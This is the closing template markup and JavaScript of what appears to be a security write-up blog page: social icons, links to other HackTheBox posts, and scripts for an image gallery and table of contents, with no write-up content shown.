<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://t.me/sckull" title="telegram" aria-label="telegram">
        <svg data-name="telegram" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="25" height="25"><path fill="currentColor" d="M 26.070313 3.996094 C 25.734375 4.011719 25.417969 4.109375 25.136719 4.21875 L 25.132813 4.21875 C 24.847656 4.332031 23.492188 4.902344 21.433594 5.765625 C 19.375 6.632813 16.703125 7.757813 14.050781 8.875 C 8.753906 11.105469 3.546875 13.300781 3.546875 13.300781 L 3.609375 13.277344 C 3.609375 13.277344 3.25 13.394531 2.875 13.652344 C 2.683594 13.777344 2.472656 13.949219 2.289063 14.21875 C 2.105469 14.488281 1.957031 14.902344 2.011719 15.328125 C 2.101563 16.050781 2.570313 16.484375 2.90625 16.722656 C 3.246094 16.964844 3.570313 17.078125 3.570313 17.078125 L 3.578125 17.078125 L 8.460938 18.722656 C 8.679688 19.425781 9.949219 23.597656 10.253906 24.558594 C 10.433594 25.132813 10.609375 25.492188 10.828125 25.765625 C 10.933594 25.90625 11.058594 26.023438 11.207031 26.117188 C 11.265625 26.152344 11.328125 26.179688 11.390625 26.203125 C 11.410156 26.214844 11.429688 26.21875 11.453125 26.222656 L 11.402344 26.210938 C 11.417969 26.214844 11.429688 26.226563 11.441406 26.230469 C 11.480469 26.242188 11.507813 26.246094 11.558594 26.253906 C 12.332031 26.488281 12.953125 26.007813 12.953125 26.007813 L 12.988281 25.980469 L 15.871094 23.355469 L 20.703125 27.0625 L 20.8125 27.109375 C 21.820313 27.550781 22.839844 27.304688 23.378906 26.871094 C 23.921875 26.433594 24.132813 25.875 24.132813 25.875 L 24.167969 25.785156 L 27.902344 6.65625 C 28.007813 6.183594 28.035156 5.742188 27.917969 5.3125 C 27.800781 4.882813 27.5 4.480469 27.136719 4.265625 C 26.769531 4.046875 26.40625 3.980469 26.070313 3.996094 Z M 25.96875 6.046875 C 25.964844 6.109375 25.976563 6.101563 25.949219 6.222656 L 25.949219 6.234375 L 22.25 25.164063 C 22.234375 25.191406 22.207031 25.25 22.132813 25.308594 C 22.054688 25.371094 21.992188 25.410156 21.667969 25.28125 L 15.757813 20.75 L 12.1875 24.003906 L 12.9375 19.214844 C 12.9375 19.214844 22.195313 10.585938 22.59375 10.214844 C 22.992188 9.84375 22.859375 9.765625 22.859375 9.765625 C 22.886719 9.3125 22.257813 9.632813 22.257813 9.632813 L 10.082031 17.175781 L 10.078125 17.15625 L 4.242188 15.191406 L 4.242188 15.1875 C 4.238281 15.1875 4.230469 15.183594 4.226563 15.183594 C 4.230469 15.183594 4.257813 15.171875 4.257813 15.171875 L 4.289063 15.15625 L 4.320313 15.144531 C 4.320313 15.144531 9.53125 12.949219 14.828125 10.71875 C 17.480469 9.601563 20.152344 8.476563 22.207031 7.609375 C 24.261719 6.746094 25.78125 6.113281 25.867188 6.078125 C 25.949219 6.046875 25.910156 6.046875 25.96875 6.046875 Z"/></svg>
      </a>
      
      
      
      
      
      <a href="https://twitter.com/sckull_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
    <h1 class="related__title">
      <hr class="hr-dots"/>
      <div>
        Read other posts
      </div>
      <hr class="hr-dots"/>
    </h1>
    <ul class="related-ul">
        
        <li>
          <a href="/posts/haze/" class="related__link">HackTheBox - Haze</a>
        </li>
        
        <li>
          <a href="/posts/bigbang/" class="related__link">HackTheBox - BigBang</a>
        </li>
        
        <li>
          <a href="/posts/jab/" class="related__link">HackTheBox - Jab</a>
        </li>
        
        <li>
          <a href="/posts/office/" class="related__link">CyberSecLabs - Office</a>
        </li>
        
        <li>
          <a href="/posts/infiltrator/" class="related__link">HackTheBox - Infiltrator</a>
        </li>
        
    </ul>
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://sckull.github.io/posts/nocturnal/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">HackTheBox - Nocturnal</div>      
      </a>
    
    <div class="grow"></div>
    
      <a href="https://sckull.github.io/posts/eureka/" class="pagination-single__right">      
        <div class="pagination-single__right-title">HackTheBox - Eureka</div>
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
        </div>
      </a>
    
  
</nav>
    
    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.7bbf2dacea5b173fe9aa699f17efbf82aeddd807831946756705aec0fc91567f.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      

<div class="search">
  <span class="icon">
    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
  </span>
  <input id="search" aria-label="Site Search" class="input" type="text" placeholder="Buscar" autocomplete="off">
  <div id="search-results" class="dropdown">
    <div id="search-menu" class="dropdown-menu" role="menu">
    </div>
  </div>
</div>


    </div>
  </div>
</main>


<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"outer\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>




<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>












  <script defer src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js" integrity="sha256-R4pqcOYV8lt7snxMQO/HSbVCFRPMdrhAFMH&#43;vr9giYI=" crossorigin="anonymous"></script>






<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    


    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("null");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');
              navbar.classList.remove('navbar--show');
              navbar.classList.remove('navbar--hide');
              navbar.classList.add('navbar--hide');

              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', link);
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.fontSize = '1rem';
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerText = "ðŸ”—";

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

